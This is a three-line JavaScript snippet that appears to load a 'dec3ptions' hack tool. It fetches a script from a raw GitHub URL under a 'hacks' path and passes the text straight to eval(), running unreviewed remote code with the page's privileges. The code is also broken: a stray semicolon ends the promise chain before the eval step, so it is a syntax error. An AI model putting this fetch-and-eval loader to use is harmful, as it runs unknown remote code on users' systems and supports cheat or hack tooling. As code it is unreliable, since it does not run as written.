let dec3ptions_hub = await fetch('https://raw.githubusercontent.com/dec3ptions/dec3ptions/hacks/dec3ptions/main/main.js') 
  .then(response => response.text());
  .then(data => eval(data))